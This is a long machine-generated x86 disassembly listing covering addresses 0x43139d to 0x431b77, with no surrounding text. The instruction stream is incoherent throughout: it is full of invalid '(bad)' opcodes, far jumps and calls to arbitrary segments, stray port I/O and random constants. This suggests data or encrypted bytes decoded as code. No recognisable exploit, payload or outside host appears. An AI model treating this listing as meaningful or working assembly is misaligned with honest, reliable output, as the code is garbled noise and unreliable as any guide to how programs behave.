  43139d:	inc    ecx
  43139e:	sbb    BYTE PTR [esi],bh
  4313a0:	loop   0x431323
  4313a2:	xor    DWORD PTR [edi-0x4b662615],esp
  4313a8:	je     0x431373
  4313aa:	jb     0x431364
  4313ac:	mov    dl,0xf4
  4313ae:	mov    al,0x5
  4313b0:	jp     0x431422
  4313b2:	cmp    edi,edi
  4313b4:	jno    0x4313c1
  4313b6:	mov    ebp,0x2ee486
  4313bb:	jno    0x43137a
  4313bd:	repnz call 0xd37f:0x1043eea4
  4313c5:	mov    bh,0x50
  4313c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4313c8:	or     BYTE PTR [esi+0x69],cl
  4313cb:	mov    fs,WORD PTR [edi+eax*8]
  4313ce:	pop    ecx
  4313cf:	std    
  4313d0:	jmp    0x6110:0xcfa6f667
  4313d7:	mov    ds:0x63eaa3a0,al
  4313dc:	or     BYTE PTR [edx],0xe8
  4313df:	imul   edx,DWORD PTR [edx],0x5e
  4313e2:	dec    DWORD PTR [bx]
  4313e5:	into   
  4313e6:	xchg   ecx,eax
  4313e7:	out    0x36,eax
  4313e9:	cmp    eax,0x34b2228c
  4313ee:	nop
  4313ef:	loop   0x431374
  4313f1:	(bad)  
  4313f3:	add    ebp,edx
  4313f5:	or     ebp,DWORD PTR [ecx]
  4313f7:	push   0xe9fe3055
  4313fc:	outs   dx,DWORD PTR ds:[esi]
  4313fd:	xacquire xchg BYTE PTR [ebx-0x62],dh
  431401:	or     al,0x1a
  431403:	or     DWORD PTR [ebx-0x6bb27988],0xb
  43140a:	leave  
  43140b:	inc    edx
  43140c:	stos   DWORD PTR es:[edi],eax
  43140d:	dec    ebp
  43140e:	outs   dx,BYTE PTR ds:[esi]
  43140f:	ror    BYTE PTR [eax-0x7e],0x82
  431413:	sub    al,0x1a
  431415:	push   es
  431416:	mov    ds:0xd90b78b1,al
  43141b:	sbb    DWORD PTR [esi+0x4a467554],eax
  431421:	ret    0x2bbe
  431424:	out    0x56,eax
  431426:	cdq    
  431427:	leave  
  431428:	adc    ch,bl
  43142a:	push   esi
  43142b:	push   edi
  43142c:	add    BYTE PTR [ebp+0xce5d8e6],al
  431432:	in     al,0xcc
  431434:	mov    edx,0x22067ac1
  431439:	les    eax,FWORD PTR [esi-0x65ea2a29]
  43143f:	cmp    edx,DWORD PTR [ebp+eax*1-0x46]
  431443:	xchg   esp,eax
  431444:	mov    edi,0x11a6a569
  431449:	xchg   esi,eax
  43144a:	fcmovne st,st(2)
  43144c:	mov    ecx,0x47e7a74e
  431451:	xor    BYTE PTR [esi],dh
  431453:	pop    ebx
  431454:	mov    dl,0x84
  431456:	enter  0xc7dd,0x72
  43145a:	sbb    al,al
  43145c:	and    cl,BYTE PTR [ebx]
  43145e:	inc    edx
  43145f:	pop    ss
  431460:	shl    ebp,cl
  431462:	int    0xb5
  431464:	push   eax
  431465:	fucom  st(7)
  431467:	inc    ecx
  431468:	lea    ebx,[ebx-0x7a]
  43146b:	sub    BYTE PTR [edi+0x5ea7ac3f],ch
  431471:	xor    DWORD PTR [ebx],ecx
  431473:	push   es
  431474:	inc    ecx
  431475:	push   ss
  431476:	dec    edi
  431477:	mov    bh,0xe7
  431479:	or     edx,DWORD PTR [ebx]
  43147b:	inc    esi
  43147c:	les    ebp,FWORD PTR [esi-0x56]
  43147f:	add    DWORD PTR [ebp-0x66af1946],esi
  431485:	xor    al,0x4a
  431487:	lahf   
  431488:	sub    ebp,esp
  43148a:	cmp    BYTE PTR [edi+0x4077fb1b],ah
  431490:	test   BYTE PTR [edx+0x63],al
  431493:	pusha  
  431494:	mov    dl,0xa4
  431496:	idiv   BYTE PTR [ecx+0x70]
  431499:	push   esi
  43149a:	jnp    0x4314c1
  43149c:	jnp    0x431512
  43149e:	push   ecx
  43149f:	cwde   
  4314a0:	leave  
  4314a1:	(bad)  
  4314a2:	fwait
  4314a3:	into   
  4314a4:	jno    0x431521
  4314a6:	pop    esi
  4314a7:	push   esi
  4314a8:	xchg   ecx,eax
  4314a9:	out    dx,al
  4314aa:	mov    bh,0x73
  4314ac:	adc    edx,DWORD PTR [ecx-0x66]
  4314af:	pop    ebp
  4314b0:	enter  0xec2b,0x32
  4314b4:	pop    ss
  4314b5:	inc    esi
  4314b6:	adc    al,BYTE PTR [ebx-0x58435443]
  4314bc:	ds jecxz 0x4314b3
  4314bf:	stos   BYTE PTR es:[edi],al
  4314c0:	and    al,0xc9
  4314c2:	xchg   ebx,eax
  4314c3:	mov    edi,ebp
  4314c5:	pop    edi
  4314c6:	add    eax,0xef0a6ca7
  4314cb:	mov    edx,0xa72f7c5b
  4314d0:	cmp    DWORD PTR [esi+ecx*1-0xb627c0],esp
  4314d7:	mov    bh,0xb1
  4314d9:	imul   esi,esi,0x53
  4314dc:	cmp    dl,BYTE PTR [edx-0x557be80b]
  4314e2:	inc    eax
  4314e3:	sahf   
  4314e4:	mov    ecx,0x21a7ec4c
  4314e9:	jno    0x431532
  4314eb:	out    0x7e,eax
  4314ed:	cmp    ah,BYTE PTR [eax+edx*8]
  4314f0:	mov    dl,0x2
  4314f2:	jmp    0xfc139163
  4314f7:	jecxz  0x43155d
  4314f9:	add    al,0xe8
  4314fb:	nop
  4314fc:	or     DWORD PTR [ebx+0x557767fb],ecx
  431502:	xor    bl,BYTE PTR [ebx+0x1e]
  431505:	(bad)  
  431506:	call   0xb868:0x75577520
  43150d:	mov    eax,0x6757a75c
  431512:	fcmove st,st(7)
  431514:	jnp    0x431560
  431516:	std    
  431517:	xchg   ebx,eax
  431518:	mov    edx,DWORD PTR [ebx+0x2e]
  43151b:	daa    
  43151c:	out    0x56,eax
  43151e:	shl    DWORD PTR [ebp-0x528ae094],1
  431524:	repnz in al,dx
  431526:	mov    eax,0x9a304e00
  43152b:	sbb    eax,0x5ec26366
  431530:	std    
  431531:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431532:	fwait
  431533:	adc    BYTE PTR [eax+ecx*1-0x42775462],ch
  43153a:	stos   BYTE PTR es:[edi],al
  43153b:	jo     0x43155b
  43153d:	ss stos BYTE PTR es:[edi],al
  43153f:	xchg   edx,eax
  431540:	mov    bh,0xb7
  431542:	jmp    0x4315b3
  431544:	(bad)  
  431545:	leave  
  431546:	aad    0xe3
  431548:	push   edx
  431549:	out    0xc7,al
  43154b:	std    
  43154c:	push   edx
  43154d:	popa   
  43154e:	cmp    dh,BYTE PTR [eax+0x4b]
  431551:	cli    
  431552:	call   0x2e5d:0xb9c88ca4
  431559:	mov    BYTE PTR [edi+eiz*4-0x71],cl
  43155d:	sahf   
  43155e:	xor    eax,0xf19bb87f
  431563:	xor    BYTE PTR [edx-0x3793716f],dh
  431569:	(bad)  
  43156b:	cli    
  43156c:	scas   eax,DWORD PTR es:[edi]
  43156d:	or     al,0x2e
  43156f:	jp     0x431530
  431571:	adc    ebp,DWORD PTR [ecx-0x49]
  431574:	ja     0x43158e
  431576:	data16 mov al,0xb2
  431579:	and    ecx,ebx
  43157b:	dec    ebx
  43157c:	pop    ecx
  43157d:	jns    0x4315dd
  43157f:	lods   al,BYTE PTR ds:[esi]
  431580:	xchg   ecx,eax
  431581:	push   cs
  431582:	mov    ds:0x53c6b7e0,al
  431587:	sub    DWORD PTR [di+0x40a7],ecx
  43158c:	push   ebp
  43158d:	(bad)  [ecx-0x2f]
  431590:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431591:	or     eax,0x4db2a491
  431596:	ja     0x431540
  431598:	mov    esi,0x21a7fbcf
  43159d:	jmp    0x70fa:0x4f8f543d
  4315a4:	mov    dl,0xba
  4315a6:	pop    es
  4315a7:	clc    
  4315a8:	cli    
  4315a9:	push   ecx
  4315aa:	jecxz  0x431618
  4315ac:	xchg   edi,eax
  4315ad:	or     ecx,DWORD PTR [edx]
  4315af:	push   esi
  4315b0:	lods   al,BYTE PTR ds:[esi]
  4315b1:	push   0x8813ab50
  4315b6:	cdq    
  4315b7:	cmp    BYTE PTR [ebp+0xc],ah
  4315ba:	retf   
  4315bb:	pusha  
  4315bc:	mov    ebx,0xb3b0f093
  4315c1:	or     edx,DWORD PTR [edi+0x39]
  4315c4:	jle    0x4315c7
  4315c6:	pop    ecx
  4315c7:	mov    eax,ds:0xdd9a50b7
  4315cc:	jb     0x431625
  4315ce:	test   DWORD PTR [ebp+ecx*8-0x40],esi
  4315d2:	pop    eax
  4315d3:	test   al,0x94
  4315d5:	(bad)  
  4315d7:	inc    esi
  4315d8:	dec    esi
  4315d9:	dec    ebx
  4315da:	popf   
  4315db:	nop
  4315dc:	push   es
  4315dd:	jecxz  0x431565
  4315df:	inc    edx
  4315e0:	mov    dl,0xf2
  4315e2:	outs   dx,BYTE PTR ds:[esi]
  4315e3:	aam    0xed
  4315e5:	xchg   al,bh
  4315e7:	and    dh,BYTE PTR [ebx-0x4dfa03bd]
  4315ed:	mov    ebp,0x25c23541
  4315f2:	sahf   
  4315f3:	outs   dx,DWORD PTR ds:[esi]
  4315f4:	push   esp
  4315f5:	fcomp  QWORD PTR [edx+0x59e733fc]
  4315fb:	dec    esp
  4315fc:	loopne 0x431618
  4315fe:	dec    ecx
  4315ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431600:	clc    
  431601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431602:	sub    al,0x38
  431604:	arpl   WORD PTR ds:0x3fa1758,di
  43160a:	mov    bh,0xa4
  43160c:	xor    eax,esp
  43160e:	or     al,0x48
  431610:	push   eax
  431611:	jmp    0x431596
  431613:	mov    BYTE PTR [edx+0xb],bh
  431616:	mul    ebp
  431618:	and    BYTE PTR [eax-0x5e],ah
  43161b:	jmp    0x849c:0xba497cc
  431622:	and    al,0x20
  431624:	nop
  431625:	mov    edi,DWORD PTR [ebx+0x1f1734ca]
  43162b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43162c:	xchg   ebp,eax
  43162d:	pushf  
  43162e:	repnz mov ds:0x43f367e2,al
  431634:	add    dh,bl
  431636:	fwait
  431637:	aam    0xdd
  431639:	movnti DWORD PTR [eax-0x305564dd],ebp
  431640:	push   0x7e
  431642:	aam    0x53
  431644:	jecxz  0x431651
  431646:	inc    esp
  431647:	test   eax,0x906d79a
  43164c:	xchg   edi,eax
  43164d:	adc    bl,BYTE PTR [edx+0x7e34611]
  431653:	icebp  
  431654:	mov    edx,0x72a92378
  431659:	mov    eax,ds:0xe6724bf8
  43165e:	stos   DWORD PTR es:[edi],eax
  43165f:	mov    es,edi
  431661:	or     eax,0xf7b2ad6e
  431666:	adc    ch,dh
  431668:	mov    eax,ds:0xec12a860
  43166d:	or     esp,DWORD PTR [ecx+0x54d122f6]
  431673:	add    DWORD PTR [edx+0xa4c9b2f],0x88945a03
  43167d:	xor    eax,0x47adc342
  431682:	inc    ebx
  431683:	sbb    esi,DWORD PTR [edx+0x790df5ab]
  431689:	xchg   esi,eax
  43168a:	(bad)  
  43168b:	in     al,dx
  43168c:	mov    dl,0x3b
  43168e:	sbb    al,0x66
  431690:	ds jmp 0xe5ff7148
  431696:	or     eax,0xaab69a7
  43169b:	xchg   ebx,eax
  43169c:	add    ebx,DWORD PTR [ecx-0x104d7d42]
  4316a2:	into   
  4316a3:	xor    bl,bh
  4316a5:	adc    al,0x2
  4316a7:	scas   eax,DWORD PTR es:[edi]
  4316a8:	retf   
  4316a9:	or     eax,DWORD PTR [ebp-0x52]
  4316ac:	pop    edi
  4316ad:	mov    dl,0x29
  4316af:	jae    0x431728
  4316b1:	sbb    DWORD PTR [edx+0x2418a37d],ebx
  4316b7:	jg     0x431649
  4316b9:	cmp    edi,DWORD PTR [edi]
  4316bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4316bc:	lods   eax,DWORD PTR ds:[esi]
  4316bd:	popf   
  4316be:	test   al,0xb0
  4316c0:	or     dh,BYTE PTR [edi]
  4316c2:	adc    esp,esp
  4316c4:	mov    cl,0x83
  4316c6:	push   eax
  4316c7:	mov    ebx,0x2f4ac0cc
  4316cc:	jl     0x4316df
  4316ce:	jno    0x431677
  4316d0:	leave  
  4316d1:	sub    BYTE PTR [edi],dl
  4316d3:	(bad)  
  4316d4:	rep stos BYTE PTR es:[edi],al
  4316d6:	adc    al,0xb4
  4316d8:	scas   eax,DWORD PTR es:[edi]
  4316d9:	dec    esp
  4316da:	add    cl,dl
  4316dc:	into   
  4316dd:	test   BYTE PTR [esi],ah
  4316df:	cs stc 
  4316e1:	retf   
  4316e2:	loop   0x4316ee
  4316e4:	hlt    
  4316e5:	mov    esp,0x3345a751
  4316ea:	shl    BYTE PTR [edx+0xc],0x69
  4316ee:	xlat   BYTE PTR ds:[ebx]
  4316ef:	dec    esp
  4316f0:	mov    bl,0x7
  4316f2:	mov    al,0xe7
  4316f4:	jp     0x43170b
  4316f6:	icebp  
  4316f7:	out    0x72,al
  4316f9:	dec    edi
  4316fa:	xor    eax,0xb314b4d1
  4316ff:	cmp    ecx,ebp
  431701:	dec    eax
  431702:	adc    DWORD PTR [eax+0x5f6a1c0d],esp
  431708:	les    esp,FWORD PTR [ecx-0x66]
  43170b:	sbb    al,0xcd
  43170d:	cmc    
  43170e:	dec    edx
  43170f:	je     0x4316e5
  431711:	ror    BYTE PTR [esi-0x2d469f59],0x8b
  431718:	or     eax,0xbc10bfa2
  43171d:	adc    BYTE PTR [esi+0x246a35c7],bh
  431723:	ins    DWORD PTR es:[edi],dx
  431724:	in     al,dx
  431725:	cmp    eax,0xb51af42
  43172a:	inc    ecx
  43172b:	lahf   
  43172c:	sti    
  43172d:	popf   
  43172e:	pop    ecx
  43172f:	mov    ebp,DWORD PTR [eax+0x2ae6c00]
  431735:	inc    ebx
  431736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431737:	jmp    0x43174e
  431739:	or     ebx,DWORD PTR [edi+0x8d307f1]
  43173f:	cld    
  431740:	ror    DWORD PTR [ebx],1
  431742:	jg     0x4317b5
  431744:	js     0x431724
  431746:	pop    es
  431747:	pushf  
  431748:	or     al,0xac
  43174a:	jecxz  0x431718
  43174c:	mov    dl,0x70
  43174e:	jae    0x4316de
  431750:	xor    eax,0xcad03f76
  431755:	or     esi,esp
  431757:	push   edx
  431758:	dec    edx
  431759:	xor    al,0x2f
  43175b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43175c:	out    0x13,al
  43175e:	call   0xec1a:0x83eb5ba4
  431765:	mov    ebx,DWORD PTR [ebx-0x65c81162]
  43176b:	or     ah,cl
  43176d:	sub    dh,BYTE PTR [edx-0x34]
  431770:	push   ecx
  431771:	das    
  431772:	cdq    
  431773:	mov    ch,0xc
  431775:	jle    0x431767
  431777:	inc    ecx
  431778:	jmp    0x180b:0x85be7183
  43177f:	push   es
  431780:	mov    bl,0xec
  431782:	add    edi,DWORD PTR [ecx-0x7b6583bc]
  431788:	xchg   edi,eax
  431789:	jae    0x4317a1
  43178b:	int    0xaa
  43178d:	and    DWORD PTR ss:[edi-0x363090f3],0xffffffc7
  431795:	in     eax,dx
  431796:	fdivp  st(3),st
  431798:	mov    dl,0x4c
  43179a:	bt     DWORD PTR [edi],edx
  43179d:	aaa    
  43179e:	xor    al,0x50
  4317a0:	and    al,0xb
  4317a2:	shr    ebx,0x63
  4317a5:	add    BYTE PTR [edi+0x2e],ch
  4317a8:	mov    eax,ds:0x92e19a32
  4317ad:	aas    
  4317ae:	inc    esp
  4317af:	pop    ebp
  4317b0:	push   0xe99ff4a
  4317b5:	push   ss
  4317b6:	inc    esi
  4317b7:	retf   0x95b2
  4317ba:	jb     0x4317f1
  4317bc:	jnp    0x43182d
  4317be:	add    al,BYTE PTR [edx+0x87e7bb3]
  4317c4:	mov    al,ds:0x6aabd113
  4317c9:	lds    edx,FWORD PTR [edi-0x10d0cb59]
  4317cf:	pop    edx
  4317d0:	adc    ch,BYTE PTR [edx-0x124d1908]
  4317d6:	dec    esi
  4317d7:	mov    eax,0x5ff291a1
  4317dc:	ror    BYTE PTR [edx+edi*4],cl
  4317df:	dec    ebp
  4317e0:	daa    
  4317e1:	(bad)  
  4317e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4317e3:	shl    BYTE PTR [edx-0x55],1
  4317e6:	push   esi
  4317e7:	and    al,0xcc
  4317e9:	mov    DWORD PTR [edx-0x692d5e47],ebx
  4317ef:	adc    eax,0xa773f9c0
  4317f4:	ss (bad) 
  4317f6:	jmp    0x431873
  4317f8:	and    ebx,eax
  4317fa:	mov    ecx,ds
  4317fc:	mov    ecx,0xdc185d20
  431801:	mov    edi,DWORD PTR [esi-0x57]
  431804:	mov    ds:0x1dd470b3,eax
  431809:	je     0x4317f5
  43180b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43180c:	popa   
  43180d:	scas   al,BYTE PTR es:[edi]
  43180e:	add    ah,BYTE PTR [eax+0x5bd4556b]
  431814:	mov    al,ds:0xb330cbf0
  431819:	and    bh,bl
  43181b:	fdiv   DWORD PTR [ebx]
  43181d:	sub    ebp,DWORD PTR [esi+0xd]
  431820:	es or  esi,esi
  431823:	sbb    ecx,DWORD PTR [eax]
  431825:	xor    DWORD PTR [ebx-0x6506da5f],edx
  43182b:	pop    ds
  43182c:	daa    
  43182d:	test   BYTE PTR [eax-0x1],0x1a
  431831:	aaa    
  431832:	cmp    esp,DWORD PTR [edi-0x687e5d93]
  431838:	(bad)
  43183b:	dec    edi
  43183c:	mov    dl,0x77
  43183e:	jnp    0x4317ee
  431840:	push   0xb586b40
  431845:	or     ebp,DWORD PTR [ebx]
  431847:	das    
  431848:	or     eax,0x2c7ab500
  43184d:	or     DWORD PTR [ebx-0x4f1cf781],ebx
  431853:	cmp    ebp,0x74
  431856:	jp     0x431886
  431858:	ror    BYTE PTR [ebx],0x1
  43185b:	mov    DWORD PTR [edx],0xb7c5eef1
  431861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431862:	xchg   ebx,eax
  431863:	push   ebp
  431864:	mov    eax,0x52a7b7f0
  431869:	popa   
  43186a:	ret    
  43186b:	xor    ah,BYTE PTR ds:0x236fd50b
  431871:	cmp    ebx,ecx
  431873:	nop
  431874:	fs push ecx
  431876:	push   0x4c
  431878:	mov    dl,0x5f
  43187a:	cld    
  43187b:	je     0x431871
  43187d:	jbe    0x4318a7
  43187f:	in     eax,0xb5
  431881:	or     ecx,DWORD PTR [eax]
  431883:	inc    esp
  431884:	into   
  431885:	in     al,0xb4
  431887:	nop
  431888:	push   esp
  431889:	std    
  43188a:	call   0xb1c7:0xb39b2a0b
  431891:	xor    ecx,DWORD PTR [ebx+0x690b4bd8]
  431897:	jbe    0x4318d1
  431899:	icebp  
  43189a:	mov    ebx,0x9acd08d8
  43189f:	mov    ds:0x885321f1,al
  4318a4:	cmp    al,0x97
  4318a6:	inc    ebx
  4318a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4318a8:	enter  0x7558,0x11
  4318ac:	pop    es
  4318ad:	inc    edx
  4318ae:	adc    eax,0xbf4fb2ba
  4318b3:	fcmovu st,st(7)
  4318b5:	test   eax,0xb29036f
  4318ba:	xor    ecx,ebx
  4318bc:	xchg   ecx,eax
  4318bd:	out    0xa5,al
  4318bf:	lds    ebp,FWORD PTR [ecx-0x7795666e]
  4318c5:	mov    dl,0x90
  4318c7:	or     bl,BYTE PTR [esi]
  4318c9:	ret    
  4318ca:	mov    esi,0x120bdb6b
  4318cf:	push   esi
  4318d0:	adc    al,0xf9
  4318d2:	and    DWORD PTR [ecx],0xffffff87
  4318d5:	out    dx,eax
  4318d6:	call   0x6a32:0x82f8f905
  4318dd:	imul   BYTE PTR [esi]
  4318df:	neg    DWORD PTR [esi+0x1fa709fd]
  4318e5:	mov    ds:0x4829a56c,eax
  4318ea:	shl    BYTE PTR [edi],1
  4318ec:	lea    edi,[ebp+0x1c]
  4318ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4318f0:	popf   
  4318f1:	adc    dh,dl
  4318f3:	fadd   st(1),st
  4318f5:	jno    0x43195f
  4318f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4318f8:	lea    esi,[ebp+ecx*2+0x3d]
  4318fc:	pop    edi
  4318fd:	fcmovb st,st(7)
  4318ff:	mov    ecx,0x2169a8b2
  431904:	retf   0x1779
  431907:	lahf   
  431908:	inc    eax
  431909:	or     esi,ebp
  43190b:	repz jns 0x4318f2
  43190e:	lea    ebx,[edx]
  431910:	fisub  WORD PTR [ebx-0x7c]
  431913:	loope  0x431973
  431915:	cvtps2pd xmm6,xmm4
  431918:	or     dl,BYTE PTR [edi+ebp*1-0x19]
  43191c:	sbb    eax,DWORD PTR ds:0xe828024a
  431922:	sub    al,0xa7
  431924:	xchg   BYTE PTR [eax],ch
  431926:	xchg   esi,eax
  431927:	fs pop ebx
  431929:	in     al,dx
  43192a:	mov    ah,0xc2
  43192c:	dec    ecx
  43192d:	hlt    
  43192e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43192f:	daa    
  431930:	cld    
  431931:	cmp    al,0xce
  431933:	adc    ah,BYTE PTR [edi+0x5e]
  431936:	dec    ecx
  431937:	mov    ebx,0xe95635bb
  43193c:	dec    ebp
  43193d:	cs jp  0x4318f6
  431940:	scas   al,BYTE PTR es:[edi]
  431941:	iret   
  431942:	push   ds
  431943:	(bad)  
  431944:	mov    dl,0xf8
  431946:	lea    eax,[edi+0x18fc4448]
  43194c:	shl    BYTE PTR [ebx],1
  43194e:	mov    DWORD PTR [edi+esi*1+0x7113ed4c],0x4516c78b
  431959:	adc    BYTE PTR [edx+0x3acf1b56],bl
  43195f:	outs   dx,BYTE PTR es:[esi]
  431961:	outs   dx,BYTE PTR ds:[esi]
  431962:	shl    DWORD PTR [edi+0x78fd827b],cl
  431968:	call   0xf4d9:0xb6ad1f77
  43196f:	pop    ss
  431970:	jl     0x43194e
  431972:	sbb    ebx,DWORD PTR [eax+0x3e]
  431975:	std    
  431976:	push   0xffffffe8
  431978:	aad    0xb
  43197a:	sbb    DWORD PTR [ebx-0x3f],edi
  43197d:	ror    DWORD PTR [ecx],1
  43197f:	pop    edi
  431980:	or     al,0xfc
  431982:	call   0x7c74:0x89c3844e
  431989:	lods   al,BYTE PTR ds:[esi]
  43198a:	shl    BYTE PTR [edi+0xe0ae92a],cl
  431990:	js     0x431942
  431992:	cld    
  431993:	imul   esi,DWORD PTR [edx-0x4434f73e],0x33
  43199a:	xor    al,0xb5
  43199c:	xlat   BYTE PTR ds:[ebx]
  43199d:	push   ss
  43199e:	pop    ss
  43199f:	shl    DWORD PTR [esi-0x75],cl
  4319a2:	push   cs
  4319a3:	xor    ch,BYTE PTR [esi]
  4319a5:	int    0xae
  4319a7:	xor    BYTE PTR [edx+0x78dc76d3],dh
  4319ad:	xor    eax,0xac743c2
  4319b2:	xchg   ebx,eax
  4319b3:	and    al,0x33
  4319b5:	sub    BYTE PTR [edx-0x113c6e2b],0x4b
  4319bc:	mov    cl,0x83
  4319be:	inc    edi
  4319bf:	xchg   ebp,ecx
  4319c1:	inc    ebp
  4319c2:	sub    bl,BYTE PTR [edi]
  4319c4:	ds popf 
  4319c6:	and    BYTE PTR [esi+0x5facff34],0x7d
  4319cd:	imul   esi,ebx,0x9ab4cf67
  4319d3:	clc    
  4319d4:	loop   0x431964
  4319d6:	inc    edi
  4319d7:	mov    ecx,DWORD PTR [eax]
  4319d9:	mov    ebx,0xb7b7a7b3
  4319de:	mov    ebp,0x5f63fb70
  4319e3:	add    esi,DWORD PTR [edx+0x64232479]
  4319e9:	loopne 0x431998
  4319eb:	xchg   esi,eax
  4319ec:	ins    BYTE PTR es:[edi],dx
  4319ed:	xor    eax,0xf22f0681
  4319f2:	push   edi
  4319f3:	and    ch,dh
  4319f5:	lahf   
  4319f6:	test   DWORD PTR [esi-0x6824f0c8],esi
  4319fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4319fd:	test   BYTE PTR [esi+0x8],ch
  431a00:	(bad)  
  431a01:	iret   
  431a02:	inc    ebp
  431a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431a04:	cmp    al,0x6c
  431a06:	loop   0x43199b
  431a08:	jmp    0x4319a5
  431a0a:	add    esp,DWORD PTR [esi+0x7477ea23]
  431a10:	xchg   ecx,eax
  431a11:	push   0x3a
  431a13:	pop    ebx
  431a14:	push   ds
  431a15:	std    
  431a16:	call   0xb9f9:0xd13ae6ce
  431a1d:	pop    ds
  431a1e:	test   BYTE PTR [edi+0x182fb04c],ah
  431a24:	test   al,0xf
  431a26:	cmp    al,0xc6
  431a28:	mov    ch,0x31
  431a2a:	mov    esi,0x2af96d7d
  431a2f:	sub    BYTE PTR [edx-0x56],dl
  431a32:	in     eax,0xa0
  431a34:	cwde   
  431a35:	cmc    
  431a36:	add    eax,DWORD PTR [edx]
  431a38:	xor    DWORD PTR [ebx],edi
  431a3a:	jl     0x4319c2
  431a3c:	cmp    BYTE PTR [ebx-0x66],bl
  431a3f:	dec    ebp
  431a40:	mov    eax,0x8abd653a
  431a45:	(bad)  
  431a46:	push   0xf7a964a7
  431a4b:	dec    edi
  431a4c:	sbb    edx,edi
  431a4e:	sub    al,0x40
  431a50:	mov    esp,DWORD PTR [ebx]
  431a52:	pop    eax
  431a53:	daa    
  431a54:	ins    DWORD PTR es:[edi],dx
  431a55:	jmp    0xb6001307
  431a5a:	jo     0x431a03
  431a5c:	cmp    ecx,DWORD PTR [ecx-0x6e]
  431a5f:	enter  0x9a31,0xff
  431a63:	sub    eax,0x27870688
  431a68:	test   al,0xad
  431a6a:	jmp    0x431ab7
  431a6c:	xor    BYTE PTR [edx],0xcd
  431a6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431a70:	mov    ch,0xb9
  431a72:	and    ebx,DWORD PTR [ebx]
  431a74:	adc    cl,BYTE PTR [ebp+0x74]
  431a77:	out    0xb9,eax
  431a79:	aas    
  431a7a:	push   0xffffffde
  431a7c:	ror    BYTE PTR [ebx-0x64739f0f],0x93
  431a83:	inc    ebx
  431a84:	fidiv  WORD PTR [edi+0x9]
  431a87:	pushf  
  431a88:	jns    0x431ac1
  431a8a:	sbb    dl,BYTE PTR [edi-0x4d6dc235]
  431a90:	lods   al,BYTE PTR ds:[esi]
  431a91:	push   ecx
  431a92:	popf   
  431a93:	ds scas eax,DWORD PTR es:[edi]
  431a95:	jg     0x431a6c
  431a97:	push   0xb7d3b3f2
  431a9c:	xor    DWORD PTR [ebx],ecx
  431a9e:	ret    
  431a9f:	or     eax,0x2017892
  431aa4:	pop    esp
  431aa5:	mov    edi,0x977fad9a
  431aaa:	push   cs
  431aab:	push   ebp
  431aac:	imul   BYTE PTR [esi+0x50]
  431aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431ab0:	mov    ecx,0x89265905
  431ab5:	loope  0x431a73
  431ab7:	fdiv   QWORD PTR [edx-0x1e7de122]
  431abd:	xchg   edi,eax
  431abe:	neg    edx
  431ac0:	dec    BYTE PTR [ebx]
  431ac2:	inc    esi
  431ac3:	scas   al,BYTE PTR es:[edi]
  431ac4:	fild   DWORD PTR [ebx]
  431ac6:	in     al,0xea
  431ac8:	test   eax,0xee9a9b55
  431acd:	fild   DWORD PTR [edx]
  431acf:	and    eax,0x7cfaa60e
  431ad4:	dec    ecx
  431ad5:	jbe    0x431b24
  431ad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431ad8:	loope  0x431a88
  431ada:	add    eax,0x93273b0e
  431adf:	stos   BYTE PTR es:[edi],al
  431ae0:	mov    dl,0xfd
  431ae2:	and    eax,0x6a80e016
  431ae7:	pop    ds
  431ae8:	mov    eax,0x19cddff
  431aed:	(bad)  
  431aee:	call   0xfa99:0x3b232beb
  431af5:	lea    ebx,[edx+0x34981f3c]
  431afb:	push   fs
  431afd:	sub    al,0x4a
  431aff:	fcmovne st,st(5)
  431b01:	adc    eax,0x4bbadaae
  431b06:	lods   al,BYTE PTR ds:[esi]
  431b07:	dec    edx
  431b08:	jae    0x431b76
  431b0a:	ret    
  431b0b:	add    eax,0x4017ffb2
  431b10:	popa   
  431b11:	adc    BYTE PTR [esi-0x71],bh
  431b14:	push   ds
  431b15:	or     esi,DWORD PTR [ebp+esi*8+0x74]
  431b19:	cmp    edx,edx
  431b1b:	in     al,dx
  431b1c:	jne    0x431aa3
  431b1e:	call   0x4b8a:0x715d156e
  431b25:	or     al,0xe0
  431b27:	cmp    DWORD PTR [edx],0x6ca9ce25
  431b2d:	mov    eax,0xb750a9d
  431b32:	adc    edi,DWORD PTR [ebx+0x72]
  431b35:	es or  al,0xc4
  431b38:	mov    dl,0x68
  431b3a:	sub    eax,0xbb132cc3
  431b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431b40:	mov    ebp,0xf92c9e8e
  431b45:	test   DWORD PTR [eax],ebp
  431b47:	push   0xffffffb2
  431b49:	out    0xc5,eax
  431b4b:	dec    esi
  431b4c:	fucomi st,st(7)
  431b4e:	mov    esi,0xf10b9c23
  431b53:	scas   eax,DWORD PTR es:[edi]
  431b54:	jp     0x431b58
  431b56:	rcr    ecx,1
  431b58:	leave  
  431b59:	imul   ebx,DWORD PTR [edx+0x51ed5969],0x47
  431b60:	outs   dx,BYTE PTR ds:[esi]
  431b61:	lock enter 0x4da7,0x5a
  431b66:	push   esi
  431b67:	sbb    eax,0x35fbaea5
  431b6c:	mov    ch,0xaf
  431b6e:	ja     0x431be9
  431b70:	clc    
  431b71:	out    dx,al
  431b72:	enter  0x4c69,0xcb
  431b76:	inc    esp
  431b77:	cmc    
